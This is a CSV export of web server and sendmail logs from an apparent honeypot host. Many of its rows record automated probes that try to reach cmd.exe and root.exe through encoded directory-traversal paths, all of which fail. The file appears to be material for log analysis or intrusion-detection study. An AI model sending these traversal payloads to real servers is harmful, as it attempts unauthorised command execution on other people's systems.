,Epoch Date,Log Type,IP Adress,Log
64,1110712918,error_log,66.131.126.31,"[error] Directory index forbidden by rule: /var/www/html/
"
65,1110714119,access_log,69.158.7.209," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
66,1110714119,error_log,69.158.7.209,"[error] Directory index forbidden by rule: /var/www/html/
"
67,1110719133,access_log,213.129.21.137," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
68,1110719133,error_log,213.129.21.137,"[error] Directory index forbidden by rule: /var/www/html/
"
69,1110721694,access_log,24.23.244.160," ""GET /scripts/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
70,1110721694,error_log,24.23.244.160,"[error] File does not exist: /var/www/html/scripts
"
71,1110721696,access_log,24.23.244.160," ""GET /MSADC/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
72,1110721696,error_log,24.23.244.160,"[error] File does not exist: /var/www/html/MSADC
"
73,1110721698,access_log,24.23.244.160," ""GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
74,1110721698,error_log,24.23.244.160,"[error] File does not exist: /var/www/html/c
"
75,1110721700,access_log,24.23.244.160," ""GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
76,1110721700,error_log,24.23.244.160,"[error] File does not exist: /var/www/html/d
"
77,1110721702,access_log,24.23.244.160," ""GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
78,1110721702,error_log,24.23.244.160,"[error] File does not exist: /var/www/html/scripts
"
79,1110721704,access_log,24.23.244.160," ""GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
80,1110721704,error_log,24.23.244.160,"[error] File does not exist: /var/www/html/_vti_bin
"
81,1110721706,access_log,24.23.244.160," ""GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
82,1110721706,error_log,24.23.244.160,"[error] File does not exist: /var/www/html/_mem_bin
"
83,1110721708,access_log,24.23.244.160," ""GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
84,1110721708,error_log,24.23.244.160,"[error] File does not exist: /var/www/html/msadc
"
85,1110721709,access_log,24.23.244.160," ""GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
86,1110721709,error_log,24.23.244.160,"[error] File does not exist: /var/www/html/scripts
"
87,1110721711,access_log,24.23.244.160," ""GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
88,1110721712,access_log,24.23.244.160," ""GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
89,1110721712,error_log,24.23.244.160,"[error] File does not exist: /var/www/html/scripts
"
90,1110721715,access_log,24.23.244.160," ""GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
91,1110721715,error_log,24.23.244.160,"[error] File does not exist: /var/www/html/scripts
"
92,1110721716,access_log,24.23.244.160," ""GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
93,1110721718,access_log,24.23.244.160," ""GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
94,1110721720,access_log,24.23.244.160," ""GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
95,1110721720,error_log,24.23.244.160,"[error] File does not exist: /var/www/html/scripts
"
96,1110721722,access_log,24.23.244.160," ""GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
97,1110721722,error_log,24.23.244.160,"[error] File does not exist: /var/www/html/scripts
"
98,1110726164,access_log,24.130.169.87," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
99,1110726164,error_log,24.130.169.87,"[error] Directory index forbidden by rule: /var/www/html/
"
100,1110729667,access_log,221.237.66.208," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
101,1110729667,error_log,221.237.66.208,"[error] Directory index forbidden by rule: /var/www/html/
"
102,1110735346,access_log,208.46.133.177," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
103,1110735346,error_log,208.46.133.177,"[error] Directory index forbidden by rule: /var/www/html/
"
104,1110737151,access_log,218.88.202.208," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
105,1110737151,error_log,218.88.202.208,"[error] Directory index forbidden by rule: /var/www/html/
"
106,1110738445,access_log,219.186.156.26," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
107,1110738445,error_log,219.186.156.26,"[error] Directory index forbidden by rule: /var/www/html/
"
108,1110744972,access_log,65.202.33.226," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
109,1110744972,error_log,65.202.33.226,"[error] Directory index forbidden by rule: /var/www/html/
"
110,1110749098,access_log,208.39.169.124," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
111,1110749098,error_log,208.39.169.124,"[error] Directory index forbidden by rule: /var/www/html/
"
112,1110751905,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
113,1110751905,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
114,1110751905,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
115,1110751905,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
116,1110751905,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
117,1110751905,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
118,1110751906,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
119,1110751906,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
120,1110751906,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
121,1110751906,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
122,1110751906,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
123,1110751906,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
124,1110751906,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
125,1110751906,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
126,1110751906,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
127,1110751906,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
128,1110751906,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
129,1110751906,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
130,1110751906,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
131,1110751906,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
132,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
133,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
134,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
135,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
136,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
137,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
138,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
139,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
140,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
141,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
142,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
143,1110751907,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
144,1110751907,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
145,1110751907,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
146,1110751907,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
147,1110751907,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
148,1110751907,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
149,1110751907,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
150,1110751907,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
151,1110751907,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
152,1110751907,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
153,1110751907,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
154,1110751908,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
155,1110751908,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
156,1110751908,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
157,1110751908,error_log,220.110.29.27,"[error] client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /
"
158,1110753511,access_log,61.205.6.71," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
159,1110753511,error_log,61.205.6.71,"[error] Directory index forbidden by rule: /var/www/html/
"
160,1110758852,access_log,68.191.137.235," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
161,1110758852,error_log,68.191.137.235,"[error] Directory index forbidden by rule: /var/www/html/
"
162,1110768521,access_log,157.91.44.1," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
163,1110768521,error_log,157.91.44.1,"[error] Directory index forbidden by rule: /var/www/html/
"
164,1110773182,mail_log,-,"combo sendmail[10169]: j2E96MKL010169: from=root, size=1045, class=0, nrcpts=1, msgid=<200503140906.j2E96MKL010169@combo.honeypotbox.com>, relay=root@localhost"
165,1110773207,mail_log,127.0.0.1,"combo sendmail[10172]: j2E96M6S010172: from=<root@combo.honeypotbox.com>, size=1359, class=0, nrcpts=1, msgid=<200503140906.j2E96MKL010169@combo.honeypotbox.com>, proto=ESMTP, daemon=MTA, relay=localhost.localdomain [127.0.0.1]"
166,1110773207,mail_log,127.0.0.1,"combo sendmail[10169]: j2E96MKL010169: to=root, ctladdr=root (0/0), delay=00:00:25, xdelay=00:00:25, mailer=relay, pri=30056, relay=[127.0.0.1] [127.0.0.1], dsn=2.0.0, stat=Sent (j2E96M6S010172 Message accepted for delivery)"
167,1110773207,mail_log,-,"combo sendmail[10173]: j2E96M6S010172: to=<root@combo.honeypotbox.com>, ctladdr=<root@combo.honeypotbox.com> (0/0), delay=00:00:00, xdelay=00:00:00, mailer=local, pri=31602, dsn=2.0.0, stat=Sent"
168,1110773466,access_log,209.213.220.227," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
169,1110773467,error_log,209.213.220.227,"[error] Directory index forbidden by rule: /var/www/html/
"
170,1110773897,mail_log,-,"combo sendmail[10384]: j2E9HFPa010384: from=root, size=39406, class=0, nrcpts=1, msgid=<200503140917.j2E9HFPa010384@combo.honeypotbox.com>, relay=root@localhost"
171,1110773915,mail_log,127.0.0.1,"combo sendmail[10386]: j2E9II6S010386: from=<root@combo.honeypotbox.com>, size=39702, class=0, nrcpts=1, msgid=<200503140917.j2E9HFPa010384@combo.honeypotbox.com>, proto=ESMTP, daemon=MTA, relay=localhost.localdomain [127.0.0.1]"
172,1110773915,mail_log,127.0.0.1,"combo sendmail[10384]: j2E9HFPa010384: to=root, ctladdr=root (0/0), delay=00:01:20, xdelay=00:00:17, mailer=relay, pri=30241, relay=[127.0.0.1] [127.0.0.1], dsn=2.0.0, stat=Sent (j2E9II6S010386 Message accepted for delivery)"
173,1110773916,mail_log,-,"combo sendmail[10387]: j2E9II6S010386: to=<root@combo.honeypotbox.com>, ctladdr=<root@combo.honeypotbox.com> (0/0), delay=00:00:01, xdelay=00:00:01, mailer=local, pri=69940, dsn=2.0.0, stat=Sent"
174,1110775614,access_log,218.201.121.99," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
175,1110775615,error_log,218.201.121.99,"[error] Directory index forbidden by rule: /var/www/html/
"
176,1110783205,access_log,222.166.160.63," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
177,1110783205,error_log,222.166.160.63,"[error] Directory index forbidden by rule: /var/www/html/
"
178,1110789835,access_log,66.21.127.198," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
179,1110789836,error_log,66.21.127.198,"[error] Directory index forbidden by rule: /var/www/html/
"
180,1110796823,access_log,24.185.27.145," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
181,1110796823,error_log,24.185.27.145,"[error] Directory index forbidden by rule: /var/www/html/
"
182,1110798760,access_log,69.246.7.31," ""GET /scripts/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
183,1110798760,access_log,69.246.7.31," ""GET /MSADC/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
184,1110798760,access_log,69.246.7.31," ""GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
185,1110798760,error_log,69.246.7.31,"[error] File does not exist: /var/www/html/scripts
"
186,1110798760,error_log,69.246.7.31,"[error] File does not exist: /var/www/html/MSADC
"
187,1110798760,error_log,69.246.7.31,"[error] File does not exist: /var/www/html/c
"
188,1110798761,access_log,69.246.7.31," ""GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
189,1110798761,access_log,69.246.7.31," ""GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
190,1110798761,access_log,69.246.7.31," ""GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
191,1110798761,error_log,69.246.7.31,"[error] File does not exist: /var/www/html/d
"
192,1110798761,error_log,69.246.7.31,"[error] File does not exist: /var/www/html/scripts
"
193,1110798761,error_log,69.246.7.31,"[error] File does not exist: /var/www/html/_vti_bin
"
194,1110798762,access_log,69.246.7.31," ""GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
195,1110798762,access_log,69.246.7.31," ""GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
196,1110798762,access_log,69.246.7.31," ""GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
197,1110798762,access_log,69.246.7.31," ""GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
198,1110798762,access_log,69.246.7.31," ""GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
199,1110798762,error_log,69.246.7.31,"[error] File does not exist: /var/www/html/_mem_bin
"
200,1110798762,error_log,69.246.7.31,"[error] File does not exist: /var/www/html/msadc
"
201,1110798762,error_log,69.246.7.31,"[error] File does not exist: /var/www/html/scripts
"
202,1110798762,error_log,69.246.7.31,"[error] File does not exist: /var/www/html/scripts
"
203,1110798763,access_log,69.246.7.31," ""GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
204,1110798763,access_log,69.246.7.31," ""GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
205,1110798763,access_log,69.246.7.31," ""GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
206,1110798763,access_log,69.246.7.31," ""GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
207,1110798763,access_log,69.246.7.31," ""GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
208,1110798763,error_log,69.246.7.31,"[error] File does not exist: /var/www/html/scripts
"
209,1110798763,error_log,69.246.7.31,"[error] File does not exist: /var/www/html/scripts
"
210,1110798763,error_log,69.246.7.31,"[error] File does not exist: /var/www/html/scripts
"
211,1110809436,access_log,67.170.0.153," ""GET /scripts/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
212,1110809436,error_log,67.170.0.153,"[error] File does not exist: /var/www/html/scripts
"
